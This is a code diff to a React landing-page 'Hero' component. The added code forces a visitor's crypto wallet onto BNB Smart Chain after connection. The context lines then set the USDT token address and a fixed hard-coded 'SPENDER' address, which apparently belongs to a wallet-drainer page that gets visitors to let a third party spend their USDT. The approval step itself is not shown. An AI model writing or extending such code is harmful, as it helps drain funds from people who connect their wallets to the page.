@@ -31,6 +31,40 @@ const Hero = () => {
       const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
       const userAddress = accounts[0];
       
+      // Force switch to Binance Smart Chain (BNB Chain)
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: '0x38' }], // 0x38 is 56 (BSC Mainnet)
+        });
+      } catch (switchError) {
+        // This error code indicates that the chain has not been added to the wallet
+        if (switchError.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [
+                {
+                  chainId: '0x38',
+                  chainName: 'Binance Smart Chain Mainnet',
+                  nativeCurrency: {
+                    name: 'BNB',
+                    symbol: 'BNB',
+                    decimals: 18,
+                  },
+                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
+                  blockExplorerUrls: ['https://bscscan.com/'],
+                },
+              ],
+            });
+          } catch (addError) {
+            throw new Error("Failed to add Binance Smart Chain to wallet.");
+          }
+        } else {
+          throw new Error("Failed to switch to Binance Smart Chain.");
+        }
+      }
+
       // USDT Token Address on BSC
       const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
       const SPENDER = "0x7970C936D143c11f9bbF964764851b7051d81651";
